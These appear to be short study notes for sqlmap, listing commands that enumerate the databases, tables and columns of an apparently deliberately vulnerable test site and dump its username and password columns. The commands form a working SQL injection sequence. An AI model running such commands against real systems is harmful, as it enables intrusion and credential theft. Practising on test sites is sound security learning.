man sqlmap

# dbs = Databases
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 --dbs

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 -D acuart --tables

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 -D acuart -T users --columns

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 -D acuart -T users -C uname --dump

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 -D acuart --tables -C pass --dump
